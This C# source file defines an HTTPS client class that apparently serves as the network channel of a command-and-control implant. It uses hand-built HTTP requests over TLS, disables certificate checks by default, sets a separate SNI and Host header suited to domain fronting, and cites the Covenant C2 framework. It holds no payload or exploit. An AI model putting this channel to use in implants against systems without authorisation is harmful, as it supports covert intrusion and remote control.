using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace ClientC2.channels
{
    public class HttpsClient
    {
        private string ip;
        private int port;
        private string sni;
        private Dictionary<string, string> defaultHeaders;
        private bool ValidateCert;

        public HttpsClient(string addr, int port, string sni, bool ValidateCert = false)
        {
            this.ip = doDNS(addr);
            this.port = port;
            this.sni = sni;
            this.defaultHeaders = new Dictionary<string, string>()
            {
                { "Host", sni },
                { "Accept", "*/*" },
                { "Accept-Language", "en" },
                //{ "Connection", "close" },
            };
            this.ValidateCert = ValidateCert;
        }

        private string doDNS(string addr)
        {
            IPAddress ip;
            if (IPAddress.TryParse(addr, out ip))
            {
                return ip.ToString();
            }
            else
            {
                IPAddress[] ipAddrs = Dns.GetHostEntry(addr).AddressList;
                Random rand = new Random();
                return ipAddrs[rand.Next(ipAddrs.Length)].ToString();
            }
        }

        private SslStream initSsl()
        {
            X509Certificate2 ourCA = new X509Certificate2();
            RemoteCertificateValidationCallback callback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (valid && ValidateCert)
                {
                    valid = errors == SslPolicyErrors.None;
                }
                return valid;
            };
            try
            {
                TcpClient client = new TcpClient(ip, port);
                SslStream sslStream = new SslStream(client.GetStream(), false, callback, null);
                // ref: https://github.com/cobbr/Covenant/pull/238/files
                sslStream.AuthenticateAsClient(sni, null, SslProtocols.Tls | (SslProtocols)768 | (SslProtocols)3072 | (SslProtocols)12288, true);
                return sslStream;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
                return null;
            }
        }

        private string readLine(SslStream sslStream)
        {
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    byte chr = (byte)sslStream.ReadByte();
                    if (chr == 13) // \r
                    {
                        sslStream.ReadByte(); // \n
                        break;
                    }
                    ms.WriteByte(chr);
                }
                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        private byte[] readFull(SslStream sslStream, int length)
        {
            using (var ms = new MemoryStream())
            {
                while (length > 0)
                {
                    byte[] buffer = new byte[length];
                    int readLen = sslStream.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readLen);
                    length -= readLen;
                }
                return ms.ToArray();
            }
        }

        private string readResponse(SslStream sslStream)
        {
            Console.WriteLine("\n\n=============================== HTTP RSP ===============================");
            bool chunked = false;
            int contentLength = -1;
            string headers = string.Empty;

            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    string line = readLine(sslStream);
                    headers += line + "\n";
                    Console.WriteLine(line);
                    if (line.ToLower().StartsWith("transfer-encoding") && line.ToLower().Contains("chunked"))
                    {
                        chunked = true;
                    }
                    if (line.ToLower().StartsWith("content-length"))
                    {
                        string val = line.Substring(line.IndexOf(":") + 1);
                        contentLength = int.Parse(val);
                    }
                    if (line.Equals("")) break;
                }

                if (chunked)
                {
                    while (true)
                    {
                        string chunkLenStr = readLine(sslStream);
                        Console.WriteLine(chunkLenStr);
                        int chunkLen = int.Parse(chunkLenStr, System.Globalization.NumberStyles.HexNumber);
                        if (chunkLen == 0) break;
                        byte[] buffer = readFull(sslStream, chunkLen);
                        Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                        ms.Write(buffer, 0, buffer.Length);
                        readLine(sslStream);
                    }
                }
                else
                {
                    if (contentLength > 0)
                    {
                        byte[] buffer = readFull(sslStream, contentLength);
                        Console.WriteLine(Encoding.UTF8.GetString(buffer));
                        ms.Write(buffer, 0, buffer.Length);
                    }
                    else if (contentLength < 0)
                    {
                        byte[] buffer = new byte[10240];
                        while (true)
                        {
                            int len = sslStream.Read(buffer, 0, buffer.Length);
                            if (len > 0)
                            {
                                Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                                ms.Write(buffer, 0, len);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    else
                    {
                        return headers;
                    }
                }
                Console.WriteLine("\n\n");
                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        private string buildHeaders(string method, Dictionary<string, string> headers, int dataLength = 0)
        {
            Dictionary<string, string> httpHeaders = new Dictionary<string, string>();
            if (headers != null)
            {
                foreach (string key in headers.Keys)
                {
                    httpHeaders[key] = headers[key];
                }
            }
            foreach (string key in defaultHeaders.Keys)
            {
                if (!httpHeaders.ContainsKey(key))
                {
                    httpHeaders[key] = defaultHeaders[key];
                }
            }
            if (method == "POST")
            {
                if (!httpHeaders.ContainsKey("Content-Type"))
                {
                    httpHeaders["Content-Type"] = "application/x-www-form-urlencoded";
                }
                httpHeaders["Content-Length"] = $@"{dataLength}";
            }
            string httpHeadersStr = "";
            foreach (string key in httpHeaders.Keys)
            {
                httpHeadersStr += $@"{key}: {httpHeaders[key]}" + "\r\n";
            }
            httpHeadersStr += "\r\n";
            return httpHeadersStr;
        }

        private string send(SslStream sslStream, string httpRequest)
        {
            Console.WriteLine("\n\n=============================== HTTP REQ ===============================");
            Console.WriteLine(httpRequest);
            Console.WriteLine("\n\n");
            sslStream.Write(Encoding.UTF8.GetBytes(httpRequest));
            sslStream.Flush();
            string rawResponse = readResponse(sslStream);
            sslStream.Close();
            return rawResponse;
        }

        public string Get(string path, Dictionary<string, string> headers = null)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "GET";
            string httpGetRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpGetRequest += buildHeaders(method, headers);
            return send(sslStream, httpGetRequest);
        }

        public string Post(string path, string data, Dictionary<string, string> headers = null)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "POST";
            string httpPostRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpPostRequest += buildHeaders(method, headers, data.Length);
            httpPostRequest += data;
            return send(sslStream, httpPostRequest);
        }

        public string Options(string path, string data)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "OPTIONS";
            string httpOptionsRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpOptionsRequest += buildHeaders(method, null, data.Length);
            httpOptionsRequest += data;
            return send(sslStream, httpOptionsRequest);
        }

        public string Put(string path, string data, Dictionary<string, string> headers = null)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "PUT";
            string httpPutRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpPutRequest += buildHeaders(method, headers, data.Length);
            httpPutRequest += data;
            return send(sslStream, httpPutRequest);
        }
    }
}
